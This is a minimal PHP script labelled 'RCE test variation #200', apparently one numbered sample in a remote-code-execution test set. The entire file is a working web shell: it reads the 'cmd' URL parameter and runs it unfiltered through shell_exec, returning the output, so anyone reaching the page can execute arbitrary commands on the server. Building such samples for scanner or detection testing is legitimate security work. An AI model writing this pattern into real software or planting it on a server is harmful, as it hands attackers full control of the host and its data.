<?php
// RCE test variation #200
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>